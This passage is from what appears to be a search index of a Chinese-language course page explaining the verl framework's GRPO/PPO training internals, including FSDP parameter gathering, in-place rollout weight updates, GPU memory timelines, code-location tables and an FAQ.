DTensor\uff0c\u672c\u5730\u5206\u7247 [1024, 8192]\n\n# \u8c03\u7528 full_tensor() \u540e\uff1a\n# 1. \u89e6\u53d1 NCCL all-gather \u64cd\u4f5c\n# 2. \u6bcf\u4e2a GPU \u6536\u96c6\u6240\u6709\u5206\u7247\n# 3. \u8fd4\u56de\u5b8c\u6574\u7684 tensor [8192, 8192] (16GB / \u6a21\u578b\u5c42\u6570)\n\n# \u901a\u4fe1\u6a21\u5f0f\uff08All-Gather\uff09\uff1a\n#     GPU 0       GPU 1       GPU 2   ...   GPU 7\n#       \u2193           \u2193           \u2193             \u2193\n#    [shard0]    [shard1]    [shard2]      [shard7]\n#       \u2193           \u2193           \u2193             \u2193\n#    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n#    \u2502         NCCL All-Gather Ring              \u2502\n#    \u2502   \u6bcf\u4e2a GPU \u5e7f\u64ad\u81ea\u5df1\u7684\u5206\u7247\u5230\u6240\u6709 GPU        \u2502\n#    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n#       \u2193           \u2193           \u2193             \u2193\n#    [full]      [full]      [full]        [full]\n#    16GB        16GB        16GB          16GB\n\n# \u901a\u4fe1\u91cf\u8ba1\u7b97\uff1a\n# - \u6bcf\u4e2a GPU \u53d1\u9001\uff1a2GB (\u81ea\u5df1\u7684\u5206\u7247)\n# - \u6bcf\u4e2a GPU \u63a5\u6536\uff1a14GB (\u5176\u4ed6 7 \u4e2a GPU \u7684\u5206\u7247)\n# - \u603b\u901a\u4fe1\u91cf\uff08per GPU\uff09\uff1a2GB + 14GB = 16GB\n# - \u5168\u5c40\u603b\u901a\u4fe1\u91cf\uff1a8 * 14GB = 112GB\n# - \u901a\u4fe1\u65f6\u95f4\uff1a~200ms\uff08NVLink \u5e26\u5bbd 600GB/s\uff09\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#64-rolloutupdate_weights-in-place","title":"6.4 rollout.update_weights() - In-Place \u53c2\u6570\u66f4\u65b0","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:728</code></p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:728\n\nawait self.rollout.update_weights(per_tensor_param, peft_config=peft_config)\n\n# ========== rollout.update_weights() \u5185\u90e8\uff08vLLM/SGLang\uff09==========\n# \u4f2a\u4ee3\u7801\uff08\u57fa\u4e8e vLLM \u5b9e\u73b0\uff09\uff1a\n\nasync def update_weights(self, per_tensor_param, peft_config=None):\n    \"\"\"\u66f4\u65b0 Rollout \u6a21\u578b\u7684\u53c2\u6570\"\"\"\n\n    # 1. \u904d\u5386\u6240\u6709\u53c2\u6570\n    for name, new_param in per_tensor_param:\n        # new_param: [\u5b8c\u6574\u7684 8B \u53c2\u6570\u4e2d\u7684\u67d0\u4e00\u5c42]\n        # \u4f8b\u5982: 'model.layers.0.self_attn.q_proj.weight' -&gt; [4096, 4096] (32MB)\n\n        # 2. \u83b7\u53d6 Rollout \u6a21\u578b\u4e2d\u5bf9\u5e94\u7684\u53c2\u6570\n        old_param = self.model.get_parameter(name)  # \u4e5f\u662f [4096, 4096]\n\n        # 3. \u76f4\u63a5\u66ff\u6362\uff08in-place \u66f4\u65b0\uff09\n        old_param.data.copy_(new_param.data)\n        # \u2192 GPU \u4e0a\u7684\u5185\u5b58\u590d\u5236\uff08cudaMemcpy\uff09\n        # \u2192 \u4e0d\u9700\u8981\u989d\u5916\u663e\u5b58\uff08in-place\uff09\n        # \u2192 \u8017\u65f6\uff1a~100ms\uff08\u590d\u5236 16GB \u6570\u636e\uff09\n\n    # 4. \u66f4\u65b0\u5b8c\u6210\u540e\uff0c\u91ca\u653e\u4e34\u65f6\u53c2\u6570\n    del per_tensor_param\n    torch.cuda.empty_cache()\n\n\n# ========== \u4e3a\u4ec0\u4e48\u662f in-place \u66f4\u65b0\uff1f ==========\n# 1. \u8282\u7701\u663e\u5b58\uff1a\u4e0d\u9700\u8981\u5206\u914d\u65b0\u7684 16GB \u7a7a\u95f4\n# 2. \u9ad8\u6548\uff1a\u76f4\u63a5\u5728 GPU \u4e0a\u590d\u5236\uff0c\u65e0\u9700 CPU \u4e2d\u8f6c\n# 3. \u4fdd\u6301 Rollout Engine \u72b6\u6001\uff1aKV Cache\u3001PageTable \u7b49\u4e0d\u53d7\u5f71\u54cd\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#65-layered-summon","title":"6.5 \u4f18\u5316\uff1a\u5206\u5c42\u540c\u6b65\uff08Layered Summon\uff09","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/utils/fsdp_utils.py:569-608</code></p> <p>\u5bf9\u4e8e\u5927\u6a21\u578b\uff0c\u53ef\u4ee5\u9010\u5c42\u540c\u6b65\u53c2\u6570\uff0c\u51cf\u5c11\u663e\u5b58\u5cf0\u503c\uff1a</p> <pre><code># \u6587\u4ef6: verl/utils/fsdp_utils.py:569-608\n\ndef layered_summon_lora_params(fsdp_module) -&gt; OrderedDict:\n    \"\"\"\u9010\u5c42\u805a\u5408\u53c2\u6570\uff0c\u51cf\u5c11\u663e\u5b58\u5cf0\u503c\"\"\"\n    lora_params = OrderedDict()\n\n    # \u904d\u5386\u6bcf\u4e00\u5c42\uff08\u5982 32 \u5c42 Transformer\uff09\n    prefix_list = [\n        \"_fsdp_wrapped_module.base_model.model.model.layers.\",\n        # ...\n    ]\n\n    for prefix in prefix_list:\n        for name, submodule in __prefix_submodules(fsdp_module, prefix):\n            # \u53ea\u805a\u5408\u5f53\u524d\u5c42\u7684\u53c2\u6570\n            if fsdp_version(submodule) &gt; 0:\n                with FSDP.summon_full_params(submodule, writeback=False):\n                    sub_lora_params = get_peft_model_state_dict(peft_model, state_dict=submodule.state_dict())\n                    sub_lora_params = {\n                        f\"{prefix}.{name}\": param.full_tensor().detach().cpu()\n                        if hasattr(param, \"full_tensor\")\n                        else param.detach().cpu()\n                        for name, param in sub_lora_params.items()\n                    }\n                    lora_params.update(sub_lora_params)\n                    submodule._is_root = False\n                # \u2192 \u663e\u5b58\u5cf0\u503c\uff1a16GB / 32 = 0.5GB\uff08\u5355\u5c42\uff09\n\n            # \u5f53\u524d\u5c42\u5904\u7406\u5b8c\u540e\u7acb\u5373\u91ca\u653e\n            get_torch_device().empty_cache()\n            # \u2192 \u663e\u5b58\u7acb\u5373\u6062\u590d\n\n    return lora_params\n\n# \u4f18\u52bf\uff1a\n# - \u4e0d\u5206\u5c42\uff1a\u5cf0\u503c 16GB\uff08\u6240\u6709\u5c42\u4e00\u6b21\u6027\u805a\u5408\uff09\n# - \u5206\u5c42\uff1a\u5cf0\u503c 0.5GB\uff08\u6bcf\u6b21\u53ea\u805a\u5408\u4e00\u5c42\uff09\n# - \u4ee3\u4ef7\uff1a\u901a\u4fe1\u6b21\u6570\u589e\u52a0\uff0832 \u6b21 vs 1 \u6b21\uff09\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#7","title":"7. \u663e\u5b58\u7ba1\u7406\u65f6\u95f4\u7ebf","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502               PPO \u5355\u6b21\u8fed\u4ee3\u7684\u663e\u5b58\u53d8\u5316\uff08GPU 0\uff09                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u65f6\u523b 0s: Trainer Mode (\u521d\u59cb)\n\u251c\u2500\u2500 Actor FSDP \u5206\u7247: 2GB\n\u251c\u2500\u2500 Actor \u4f18\u5316\u5668: 4GB (\u6216 CPU offload: 0GB)\n\u251c\u2500\u2500 Rollout \u53c2\u6570: 16GB\n\u2514\u2500\u2500 \u603b\u8ba1: 22GB (\u6216 18GB)\n\n\u65f6\u523b 0-1s: generate_sequences() \u2192 rollout_mode()\n\u251c\u2500\u2500 load_fsdp_model_to_gpu: 22GB \u2192 24GB (+2GB, \u5982\u679c\u4e4b\u524d offload)\n\u251c\u2500\u2500 params.full_tensor(): 24GB \u2192 40GB (+16GB, \u4e34\u65f6)\n\u251c\u2500\u2500 update_weights: 40GB \u2192 40GB (in-place)\n\u251c\u2500\u2500 \u91ca\u653e\u4e34\u65f6\u53c2\u6570: 40GB \u2192 24GB (-16GB)\n\u251c\u2500\u2500 resume KV Cache: 24GB \u2192 56GB (+32GB)\n\u2514\u2500\u2500 \u603b\u8ba1: 56GB \u2190 \u5168\u5c40\u5cf0\u503c\n\n\u65f6\u523b 1-2s: Rollout \u63a8\u7406\n\u251c\u2500\u2500 KV Cache \u52a8\u6001\u4f7f\u7528: 56GB \u2192 50GB (\u90e8\u5206\u4f7f\u7528)\n\u2514\u2500\u2500 \u603b\u8ba1: ~50GB\n\n\u65f6\u523b 2s: trainer_mode()\n\u251c\u2500\u2500 release KV Cache: 50GB \u2192 18GB (-32GB)\n\u2514\u2500\u2500 \u603b\u8ba1: 18GB\n\n\u65f6\u523b 2-3s: compute_log_prob()\n\u251c\u2500\u2500 load_fsdp_model_to_gpu: 18GB \u2192 20GB (+2GB, \u5982\u679c\u4e4b\u524d offload)\n\u251c\u2500\u2500 Forward Pass \u6fc0\u6d3b: 20GB \u2192 24GB (+4GB)\n\u251c\u2500\u2500 offload_fsdp_model_to_cpu: 24GB \u2192 22GB (-2GB, \u5982\u679c\u914d\u7f6e\u4e86)\n\u2514\u2500\u2500 \u603b\u8ba1: 22GB\n\n\u65f6\u523b 3-6s: update_actor()\n\u251c\u2500\u2500 load_fsdp_model_to_gpu: 22GB \u2192 24GB (+2GB)\n\u251c\u2500\u2500 load_fsdp_optimizer: 24GB \u2192 28GB (+4GB)\n\u251c\u2500\u2500 Forward + Backward: 28GB \u2192 38GB (+10GB, \u6fc0\u6d3b + \u68af\u5ea6)\n\u251c\u2500\u2500 Optimizer Step: 38GB \u2192 38GB (in-place)\n\u251c\u2500\u2500 offload: 38GB \u2192 22GB (-16GB)\n\u2514\u2500\u2500 \u603b\u8ba1: 22GB\n\n\u65f6\u523b 6s: \u8fed\u4ee3\u7ed3\u675f\uff0c\u56de\u5230\u521d\u59cb\u72b6\u6001\n\u2514\u2500\u2500 \u603b\u8ba1: 22GB\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                        \u5cf0\u503c\u663e\u5b58\u5206\u6790                                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u5168\u5c40\u5cf0\u503c: 56GB (Rollout Mode + KV Cache)\n  \u251c\u2500\u2500 rollout_mode() \u4e2d\u7684 params.full_tensor(): 40GB\n  \u251c\u2500\u2500 rollout_mode() \u4e2d\u7684 resume KV Cache: 56GB \u2190 \u5168\u5c40\u6700\u5927\n  \u2514\u2500\u2500 update_actor() \u4e2d\u7684 Forward + Backward: 38GB\n\n\u4f18\u5316\u65b9\u5411:\n1. \u542f\u7528 Parameter Offload: \u51cf\u5c11 Actor \u53c2\u6570\u663e\u5b58\uff08-2GB\uff09\n2. \u542f\u7528 Optimizer Offload: \u51cf\u5c11\u4f18\u5316\u5668\u663e\u5b58\uff08-4GB\uff09\n3. \u51cf\u5c11 KV Cache: \u8c03\u6574 gpu_memory_utilization\uff08-10GB\uff09\n4. \u4f7f\u7528 Layered Summon: \u51cf\u5c11\u53c2\u6570\u540c\u6b65\u5cf0\u503c\uff08-10GB\uff09\n5. \u51cf\u5c11 batch size: \u51cf\u5c11\u6fc0\u6d3b\u503c\u663e\u5b58\uff08-4GB\uff09\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#8","title":"8. \u4ee3\u7801\u4f4d\u7f6e\u7d22\u5f15","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#81","title":"8.1 \u8d44\u6e90\u521d\u59cb\u5316","text":"\u529f\u80fd \u6587\u4ef6\u8def\u5f84 \u884c\u53f7 \u521b\u5efa\u8d44\u6e90\u6c60 <code>verl/trainer/main_ppo.py</code> 166-189 \u521d\u59cb\u5316 workers <code>verl/trainer/ppo/ray_trainer.py</code> 661-796 \u521b\u5efa\u878d\u5408 Worker \u7c7b <code>verl/single_controller/ray/base.py</code> 749-790 \u521b\u5efa RayWorkerGroup <code>verl/single_controller/ray/base.py</code> 361-444 Spawn \u673a\u5236 <code>verl/single_controller/ray/base.py</code> 478-512"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#82","title":"8.2 \u6a21\u578b\u521d\u59cb\u5316","text":"\u529f\u80fd \u6587\u4ef6\u8def\u5f84 \u884c\u53f7 <code>__init__()</code> Worker \u521d\u59cb\u5316 <code>verl/workers/fsdp_workers.py</code> 139-263 <code>init_model()</code> \u5165\u53e3 <code>verl/workers/fsdp_workers.py</code> 760-820 <code>_build_model_optimizer()</code> FSDP \u6784\u5efa <code>verl/workers/fsdp_workers.py</code> 268-589 - \u52a0\u8f7d Tokenizer <code>verl/workers/fsdp_workers.py</code> 304-311 - \u786e\u5b9a\u6a21\u578b dtype <code>verl/workers/fsdp_workers.py</code> 314-320 - \u52a0\u8f7d\u6a21\u578b\u914d\u7f6e <code>verl/workers/fsdp_workers.py</code> 323-346 - \u521d\u59cb\u5316\u6a21\u578b\uff08from_pretrained\uff09 <code>verl/workers/fsdp_workers.py</code> 348-389 - \u5e94\u7528\u4f18\u5316\uff08Liger/Gradient Checkpointing/LoRA\uff09 <code>verl/workers/fsdp_workers.py</code> 392-432 - FSDP1 \u521d\u59cb\u5316\uff08\u5173\u952e\uff09 <code>verl/workers/fsdp_workers.py</code> 497-507 - FSDP2 \u521d\u59cb\u5316\uff08\u5173\u952e\uff09 <code>verl/workers/fsdp_workers.py</code> 530-532 - \u521b\u5efa\u4f18\u5316\u5668 <code>verl/workers/fsdp_workers.py</code> 542-589 <code>_build_rollout()</code> Rollout \u6784\u5efa <code>verl/workers/fsdp_workers.py</code> 591-630 \u914d\u7f6e state_dict \u7c7b\u578b <code>verl/workers/fsdp_workers.py</code> 634-644 \u521d\u59cb\u5316\u540e\u5207\u6362\u5230 Trainer Mode <code>verl/workers/fsdp_workers.py</code> 650-656"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#83","title":"8.3 \u8bad\u7ec3\u5faa\u73af","text":"\u529f\u80fd \u6587\u4ef6\u8def\u5f84 \u884c\u53f7 PPO \u8bad\u7ec3\u5faa\u73af <code>verl/trainer/ppo/ray_trainer.py</code> 962-1259 \u751f\u6210\u5e8f\u5217\uff08\u8c03\u7528\uff09 <code>verl/trainer/ppo/ray_trainer.py</code> 1042-1050 \u8ba1\u7b97 Reward <code>verl/trainer/ppo/ray_trainer.py</code> 1088-1098 \u8ba1\u7b97 Old Log Prob\uff08\u8c03\u7528\uff09 <code>verl/trainer/ppo/ray_trainer.py</code> 1100-1110 \u8ba1\u7b97 Advantage <code>verl/trainer/ppo/ray_trainer.py</code> 1132-1164 \u66f4\u65b0 Actor\uff08\u8c03\u7528\uff09 <code>verl/trainer/ppo/ray_trainer.py</code> 1174-1180"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#84","title":"8.4 \u6a21\u5f0f\u5207\u6362\uff08\u6838\u5fc3\uff09","text":"\u529f\u80fd \u6587\u4ef6\u8def\u5f84 \u884c\u53f7 <code>rollout_mode()</code> \u5b9a\u4e49 <code>verl/workers/fsdp_workers.py</code> 658-739 <code>trainer_mode()</code> \u5b9a\u4e49 <code>verl/workers/fsdp_workers.py</code> 741-757 <code>generate_sequences()</code> - \u5207\u6362\u5230 Rollout <code>verl/workers/fsdp_workers.py</code> 945-950 <code>generate_sequences()</code> - \u5207\u6362\u56de Trainer <code>verl/workers/fsdp_workers.py</code> 960-964"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#85","title":"8.5 \u53c2\u6570\u540c\u6b65","text":"\u529f\u80fd \u6587\u4ef6\u8def\u5f84 \u884c\u53f7 \u6536\u96c6 FSDP \u53c2\u6570 <code>verl/workers/fsdp_workers.py</code> 679 \u8f6c\u6362\u4e3a full_tensor <code>verl/workers/fsdp_workers.py</code> 708-714 \u66f4\u65b0 Rollout \u53c2\u6570 <code>verl/workers/fsdp_workers.py</code> 728 \u5206\u5c42\u540c\u6b65\uff08Layered Summon\uff09 <code>verl/utils/fsdp_utils.py</code> 569-608 \u6536\u96c6 LoRA \u53c2\u6570 <code>verl/utils/fsdp_utils.py</code> 611-650"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#86-worker","title":"8.6 Worker \u65b9\u6cd5\u5b9e\u73b0","text":"\u529f\u80fd \u6587\u4ef6\u8def\u5f84 \u884c\u53f7 <code>generate_sequences()</code> <code>verl/workers/fsdp_workers.py</code> 927-984 <code>compute_log_prob()</code> <code>verl/workers/fsdp_workers.py</code> 986-1026 <code>update_actor()</code> <code>verl/workers/fsdp_workers.py</code> 877-923"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#9","title":"9. \u6027\u80fd\u4f18\u5316\u5efa\u8bae","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#91","title":"9.1 \u663e\u5b58\u4f18\u5316","text":"\u4f18\u5316\u65b9\u6cd5 \u8282\u7701\u663e\u5b58 \u4ee3\u4ef7 \u914d\u7f6e\u53c2\u6570 Parameter Offload 2GB CPU\u2194GPU \u4f20\u8f93\u5ef6\u8fdf ~50ms <code>actor.model.enable_parameter_offload=True</code> Optimizer Offload 4GB CPU\u2194GPU \u4f20\u8f93\u5ef6\u8fdf ~100ms <code>actor.optimizer.enable_optimizer_offload=True</code> \u51cf\u5c11 gpu_memory_utilization 10-20GB KV Cache \u5bb9\u91cf\u51cf\u5c0f\uff0cbatch size \u53d7\u9650 <code>rollout.gpu_memory_utilization=0.4</code> Layered Summon (LoRA) 10-15GB \u589e\u52a0\u901a\u4fe1\u6b21\u6570\uff0832x\uff09 <code>rollout.layered_summon=True</code> free_cache_engine=True 32GB \u6bcf\u6b21\u91cd\u65b0\u5206\u914d KV Cache \u5f00\u9500 <code>rollout.free_cache_engine=True</code> \u51cf\u5c11 rollout batch size 5-10GB \u63a8\u7406\u541e\u5410\u91cf\u964d\u4f4e <code>rollout.rollout_batch_size=128</code>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#92","title":"9.2 \u901a\u4fe1\u4f18\u5316","text":"\u4f18\u5316\u65b9\u6cd5 \u8282\u7701\u65f6\u95f4 \u9002\u7528\u573a\u666f \u4f7f\u7528 NVLink/NVSwitch ~50% \u591a GPU \u540c\u673a\u8bad\u7ec3 \u542f\u7528 NCCL \u538b\u7f29 ~20% \u4f4e\u5e26\u5bbd\u7f51\u7edc \u51cf\u5c11\u53c2\u6570\u540c\u6b65\u9891\u7387 ~30% \u5c0f\u6b65\u957f\u66f4\u65b0 Gradient Checkpointing ~10% \u51cf\u5c11\u6fc0\u6d3b\u503c\u663e\u5b58\uff0c\u95f4\u63a5\u51cf\u5c11\u901a\u4fe1"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#93","title":"9.3 \u63a8\u7406\u4f18\u5316","text":"\u4f18\u5316\u65b9\u6cd5 \u63d0\u5347\u541e\u5410 \u914d\u7f6e\u53c2\u6570 \u589e\u52a0 KV Cache ~50% <code>rollout.gpu_memory_utilization=0.8</code> \u4f7f\u7528 PagedAttention ~2x vLLM/SGLang \u9ed8\u8ba4\u542f\u7528 \u542f\u7528 Continuous Batching ~3x vLLM/SGLang \u9ed8\u8ba4\u542f\u7528 \u4f7f\u7528 FP8 \u91cf\u5316 ~2x <code>rollout.quantization=fp8</code>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#94","title":"9.4 \u8bad\u7ec3\u4f18\u5316","text":"\u4f18\u5316\u65b9\u6cd5 \u63d0\u5347\u901f\u5ea6 \u914d\u7f6e\u53c2\u6570 Gradient Accumulation ~30% <code>actor.gradient_accumulation_steps=4</code> Mixed Precision (BF16) ~50% <code>actor.mixed_precision=bf16</code> Flash Attention ~2x <code>actor.use_flash_attention=True</code> Activation Checkpointing ~20% <code>actor.enable_gradient_checkpointing=True</code>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#10-faq","title":"10. \u5e38\u89c1\u95ee\u9898 (FAQ)","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q1-trainer-mode","title":"Q1: \u4e3a\u4ec0\u4e48\u521d\u59cb\u5316\u540e\u8981\u5207\u6362\u5230 Trainer Mode\uff1f","text":"<p>A: \u6839\u636e\u4ee3\u7801\u6ce8\u91ca\uff08<code>verl/workers/fsdp_workers.py:651</code>\uff09\uff1a</p> <p>It's critical that hybrid engine in trainer mode initially to load checkpoint.</p> <p>\u539f\u56e0\uff1a 1. \u52a0\u8f7d checkpoint \u65f6\u9700\u8981 Actor FSDP \u5728 GPU\uff08\u7528\u4e8e\u52a0\u8f7d\u53c2\u6570\uff09 2. Rollout KV Cache \u5728\u521d\u59cb\u5316\u65f6\u4f1a\u5360\u7528\u5927\u91cf\u663e\u5b58\uff0832GB\uff09\uff0c\u9700\u8981\u91ca\u653e 3. \u8bad\u7ec3\u5f00\u59cb\u524d\u53ef\u80fd\u9700\u8981\u6267\u884c\u9a8c\u8bc1\uff08validation\uff09\uff0c\u9700\u8981 Trainer Mode</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q2-rollout","title":"Q2: \u4e3a\u4ec0\u4e48\u6bcf\u6b21 Rollout \u90fd\u8981\u540c\u6b65\u53c2\u6570\uff0c\u4e0d\u80fd\u53ea\u540c\u6b65\u4e00\u6b21\uff1f","text":"<p>A: \u56e0\u4e3a Actor \u6a21\u578b\u5728\u6bcf\u6b21\u8bad\u7ec3\u8fed\u4ee3\u540e\u90fd\u4f1a\u66f4\u65b0\u53c2\u6570\uff08<code>update_actor()</code>\uff09\u3002\u5982\u679c\u4e0d\u540c\u6b65\uff0cRollout \u4f1a\u4e00\u76f4\u4f7f\u7528\u521d\u59cb\u53c2\u6570 W0\uff0c\u800c\u4e0d\u662f\u6700\u65b0\u53c2\u6570 W_t\uff0c\u5bfc\u81f4 PPO \u7684 importance sampling \u5931\u6548\uff0c\u8bad\u7ec3\u53d1\u6563\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q3-fsdp-state_dict-sharded_state_dict","title":"Q3: FSDP \u7684 state_dict() \u4e3a\u4ec0\u4e48\u914d\u7f6e\u4e3a SHARDED_STATE_DICT\uff1f","text":"<p>A: 1. \u8282\u7701\u663e\u5b58\uff1a\u4e0d\u5728 <code>state_dict()</code> \u9636\u6bb5\u89e6\u53d1 all-gather 2. \u5ef6\u8fdf\u805a\u5408\uff1a\u5728\u540e\u7eed\u7684 <code>full_tensor()</code> \u8c03\u7528\u65f6\u624d\u89e6\u53d1 all-gather 3. \u7075\u6d3b\u6027\uff1a\u53ef\u4ee5\u9009\u62e9\u6027\u5730\u805a\u5408\u67d0\u4e9b\u5c42\uff08layered_summon\uff09</p> <p>\u5982\u679c\u914d\u7f6e\u4e3a <code>FULL_STATE_DICT</code>\uff0c\u4f1a\u5728 <code>state_dict()</code> \u65f6\u5c31\u89e6\u53d1 all-gather\uff0c\u5cf0\u503c\u663e\u5b58\u66f4\u9ad8\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q4-rolloutupdate_weights-in-place","title":"Q4: rollout.update_weights() \u4e3a\u4ec0\u4e48\u662f in-place \u66f4\u65b0\uff1f","text":"<p>A: 1. \u8282\u7701\u663e\u5b58\uff1a\u4e0d\u9700\u8981\u5206\u914d\u65b0\u7684 16GB \u7a7a\u95f4 2. \u9ad8\u6548\uff1a\u76f4\u63a5\u5728 GPU \u4e0a\u590d\u5236\uff08cudaMemcpy\uff09\uff0c\u65e0\u9700 CPU \u4e2d\u8f6c 3. \u4fdd\u6301 Rollout Engine \u72b6\u6001\uff1aKV Cache\u3001PageTable \u7b49\u4e0d\u53d7\u5f71\u54cd</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q5-rollout_mode","title":"Q5: \u5982\u4f55\u51cf\u5c11 rollout_mode() \u7684\u5cf0\u503c\u663e\u5b58\uff1f","text":"<p>A: 1. \u542f\u7528 Parameter Offload\uff1aActor FSDP offload \u5230 CPU\uff08-2GB\uff09 2. \u4f7f\u7528 Layered Summon\uff1a\u9010\u5c42\u805a\u5408\u53c2\u6570\uff08\u5cf0\u503c\u4ece 40GB \u964d\u5230 ~2GB\uff09 3. \u51cf\u5c11 KV Cache\uff1a\u8c03\u6574 <code>gpu_memory_utilization</code>\uff08-10-20GB\uff09</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q6-spawn","title":"Q6: Spawn \u673a\u5236\u7684\u672c\u8d28\u662f\u4ec0\u4e48\uff1f","text":"<p>A: Spawn \u521b\u5efa\u4e86\u591a\u4e2a\"\u89c6\u56fe\"\uff08RayWorkerGroup 